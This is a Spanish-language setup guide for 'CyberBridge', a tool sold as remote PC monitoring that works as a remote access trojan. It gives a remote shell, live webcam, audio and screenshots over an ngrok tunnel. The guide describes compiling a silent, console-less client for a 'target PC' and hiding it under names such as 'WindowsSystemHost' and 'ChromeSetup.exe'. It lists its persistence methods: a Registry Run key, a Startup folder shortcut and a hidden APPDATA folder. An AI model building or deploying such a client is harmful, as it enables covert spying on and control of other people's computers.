# 🟢 CyberBridge - Guía de Instalación y Uso

> Sistema de monitoreo remoto para tu PC.

> Interfaz de servidor (verde/negro) + cliente compilado como `.exe`.

---


## 🛠️ Requisitos Previos

### En tu máquina (servidor):
- Python 3.10+
- pip
- ngrok instalado y configurado

### En la PC objetivo (cliente):
- Windows 10/11
- Python 3.10+ (si ejecutas sin compilar)
- Para el .exe compilado: solo Windows (no necesita Python)

---

## 📦 Paso 1: Instalar Dependencias

En la carpeta raíz del proyecto, ejecuta:

```bash
cd CyberBridge
pip install -r requirements.txt
```

Esto instalará:
- **Flask + Werkzeug** - Servidor HTTP
- **requests** - Cliente HTTP
- **psutil** - Información del sistema
- **cryptography** - Criptografía
- **opencv-python** - Cámara
- **Pillow** - Capturas de pantalla
- **pyaudio** - Audio
- **pywin32** - Servicio Windows
- **pyinstaller** - Compilación a .exe

---

## ⚙️ Paso 2: Configurar la URL del Servidor

El cliente necesita saber dónde está el servidor. Edita el archivo:

### 📂 `CyberBridge/client/config.py`

```python
# ─── Server address ────────────────────────────────────────────────────────────
SERVER_URL = "https://TU-URL-NGROK.ngrok-free.app"

# ─── Polling ──────────────────────────────────────────────────────────────────
POLL_INTERVAL = 3  # Segundos entre cada petición de comandos al servidor
```

### Opciones de URL según tu caso:

| Método | URL a configurar |
|--------|------------------|
| **ngrok** | `https://xxxx-xxx-xxx-xxx.ngrok-free.app` |
| **Tailscale** | `http://100.x.x.x:18812` |
| **LAN (red local)** | `http://192.168.x.x:18812` |

> **IMPORTANTE**: Cambia la URL ANTES de compilar el cliente. Si cambias la URL después de compilar, tendrás que recompilar.

---

## 🚀 Paso 3: Levantar ngrok

El servidor corre en el puerto 18812. Expón ese puerto con ngrok:

### En una terminal separada, ejecuta:

```bash
ngrok http 18812 --log=stdout
```

O simplemente:

```bash
ngrok http 18812
```

### Copia la URL pública que ngrok te da
Se verá algo como:
```
https://1b19-190-107-209-205.ngrok-free.app
```

Usa esa URL en `client/config.py` como se explicó arriba.

---

## 🖥️ Paso 4: Iniciar el Backend (Servidor)

Desde la carpeta del proyecto, ejecuta:

```bash
cd CyberBridge
python -m server.main
```

O alternativamente:

```bash
cd CyberBridge
python server/main.py
```

Esto abrirá la interfaz gráfica del servidor con:
- Panel de conexiones (izquierda)
- Terminal remota
- Información del sistema (CPU, RAM, disco)
- Cámara web en vivo
- Capturas de pantalla
- Audio en vivo
- Matrix rain decorativo 😎

---

## 🏗️ Paso 5: Compilar el Cliente (Build)

Si quieres crear el archivo `.exe` para instalar en la PC objetivo:

```bash
cd CyberBridge
python build_client.py
```

### Qué hace este comando:
1. Compila el cliente en un solo archivo `.exe`
2. Oculta la ventana de consola (totalmente silencioso)
3. Genera el archivo en `dist/.exe`

### Output esperado:
```
[CyberBridge] Building Windows Service .exe…
...
[CyberBridge] Done! → dist/file.exe

── Next steps (run as Administrator) ──────────────────────
  dist\file.exe install   ← register service
  dist\file.exe start     ← start service
  dist\file.exe stop       ← stop service
  dist\file.exe remove    ← uninstall service
```

---

## 📥 Paso 6: Instalar el Cliente en la PC Objetivo

### Opción A: Si compilaste el .exe

Copia `dist/file.exe` a la PC objetivo y ejecuta doble click

```cmd
dist\file.exe install
dist\file.exe start
```

### Opción B: Si ejecutas desde código Python

En la PC objetivo:

```bash
cd CyberBridge
python client/service.py install
python client/service.py start
```

---

## 🔒 Métodos de Persistencia del Cliente

| Método | Descripción |
|--------|-------------|
| **Registry Run key** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystemHost` |
| **Startup folder** | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.lnk` |
| **Carpeta oculta** | `%APPDATA%\Microsoft\Windows\SystemHost\file.exe` (atributo oculto) |
| **Sin ventana de consola** | Compilado con `--noconsole` en PyInstaller |



```bash
# 1. Instalar dependencias
pip install -r requirements.txt

# 2. Configurar URL en client/config.py

# 3. Levantar ngrok (en terminal separada)
ngrok http 18812

# 4. Iniciar servidor
python server/main.py

# 5. Compilar cliente (opcional)
python build_client.py

# 6. Instalar cliente en PC objetivo (como Admin)
dist\ChromeSetup.exe install
dist\ChromeSetup.exe start
```

---
